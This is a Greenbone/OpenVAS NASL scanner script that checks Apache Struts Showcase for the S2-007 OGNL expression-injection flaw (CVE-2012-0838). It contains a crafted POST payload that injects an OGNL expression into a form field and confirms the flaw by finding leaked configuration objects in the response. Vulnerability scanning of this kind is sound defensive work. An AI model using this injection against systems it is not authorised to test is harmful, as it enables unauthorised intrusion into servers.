# Copyright (C) 2012 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:apache:struts";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802425");
  script_version("2021-04-01T07:54:37+0000");
  script_cve_id("CVE-2012-0838");
  script_bugtraq_id(49728);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2021-04-01 10:13:05 +0000 (Thu, 01 Apr 2021)");
  script_tag(name:"creation_date", value:"2012-03-13 14:59:53 +0530 (Tue, 13 Mar 2012)");
  script_name("Apache Struts Showcase Arbitrary Java Method Execution Vulnerability (S2-007)");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_apache_struts_consolidation.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("apache/struts/http/detected");

  script_xref(name:"URL", value:"http://jvn.jp/en/jp/JVN79099262/index.html");
  script_xref(name:"URL", value:"https://cwiki.apache.org/confluence/display/WW/S2-007");
  script_xref(name:"URL", value:"http://jvndb.jvn.jp/en/contents/2012/JVNDB-2012-000012.html");
  script_xref(name:"Advisory-ID", value:"S2-007");

  script_tag(name:"summary", value:"Apache Struts is prone to a java method execution
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the
  response.");

  script_tag(name:"insight", value:"The flaw is due to an improper conversion in OGNL
  expression if a non string property is contained in action.");

  script_tag(name:"impact", value:"Successful exploitation could allow an attacker to
  execute arbitrary java method. Further that results to disclose environment variables or
  cause a denial of service or an arbitrary OS command can be executed.");

  script_tag(name:"affected", value:"Apache Struts (Showcase) 2.x through 2.2.3.");

  script_tag(name:"solution", value:"Update to version 2.2.3.1 or later.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

dir += "/struts2-showcase";

useragent = http_get_user_agent();
host = http_host_name(port:port);

req = http_get(item:dir + "/showcase.action", port:port);
res = http_keepalive_send_recv(port:port, data:req);
if(!res)
  exit(0);

if(">Showcase</" >< res && ">Struts Showcase<" >< res) {

  postdata = "requiredValidatorField=&requiredStringValidatorField" +
             "=&integerValidatorField=%22%3C%27+%2B+%23application" +
             "+%2B+%27%3E%22&dateValidatorField=&emailValidatorFie" +
             "ld=&urlValidatorField=&stringLengthValidatorField=&r" +
             "egexValidatorField=&fieldExpressionValidatorField=";

  url = dir + "/validation/submitFieldValidatorsExamples.action";

  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "User-Agent: ", useragent, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postdata), "\r\n",
               "\r\n", postdata);
  res = http_keepalive_send_recv(port:port, data:req);

  if(res && ".template.Configuration@" >< res && ">Struts Showcase<" >< res) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
  exit(99);
}

exit(0);